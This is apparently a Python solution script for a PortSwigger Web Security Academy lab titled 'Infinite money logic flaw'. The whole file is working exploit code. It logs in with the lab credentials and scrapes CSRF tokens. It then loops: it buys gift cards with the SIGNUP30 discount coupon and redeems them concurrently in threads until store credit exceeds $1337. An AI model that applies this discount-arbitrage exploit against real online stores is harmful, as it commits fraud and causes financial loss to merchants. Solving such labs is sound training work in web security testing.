#LAB: Infinite money logic flaw

import requests
import re
from threading import Thread

# Setup proxy for debug
proxies = {
    'http': 'http://127.0.0.1:8080', 
    'https': 'http://127.0.0.1:8080'
}

# URL LAB ID
url = 'https://0a0700fa04daf3948242f1f2003a000d.web-security-academy.net'

session = requests.Session()
login_csrf = re.findall(r'name="csrf".*?value="(.*?)">', session.get(url + '/login').text)[0]
csrf = re.findall(r'name="csrf".*?value="(.*?)">', session.post(url + '/login', data={'username':'wiener', 'password':'peter', 'csrf':login_csrf}).text)[0]

# Function for redeem gift card
def redeem_gift(gift_card):
  data = {
    'gift-card' : gift_card,
    'csrf' : csrf
  }
  session.post(url + '/gift-card', data=data, proxies=proxies, verify=False, allow_redirects=False)

# Loop until have 1337$
while True:
  # Get credit
  credit = int(float(re.findall(r'<strong>Store credit: \$(.*?)</strong>', session.get(url + '/cart').text)[0])) 
  if (credit > 1337):
    break
  num_of_gift = credit // 10
  if num_of_gift > 99:
    num_of_gift = 99 # Server limit
  
  # Add number of gift card to card
  cart_data = {
    'productId':'2', # Gift card product Id
    'redir':'PRODUCT',
    'quantity': num_of_gift
  }
  session.post(url +'/cart', data=cart_data, proxies=proxies, verify=False, allow_redirects=False)

  # Apply -30% coupon
  coupon = {
    'csrf' : csrf,
    'coupon' : 'SIGNUP30'
  }
  session.post(url + '/cart/coupon', data=coupon, proxies=proxies, verify=False, allow_redirects=False)
  
  # Checkout and get gift card list
  gift_cards = re.findall( r'<td>(.{10}?)</td>', session.post(url + '/cart/checkout', data={'csrf':csrf}, proxies=proxies, verify=False).text)
  
  # Redeem all gift card by thread
  threads = []
  for i in range(len(gift_cards)):
    threads.append(Thread(target=redeem_gift, args=(gift_cards[i],)))
    threads[i].start() 
  
  for i in range(len(gift_cards)):
    threads[i].join()
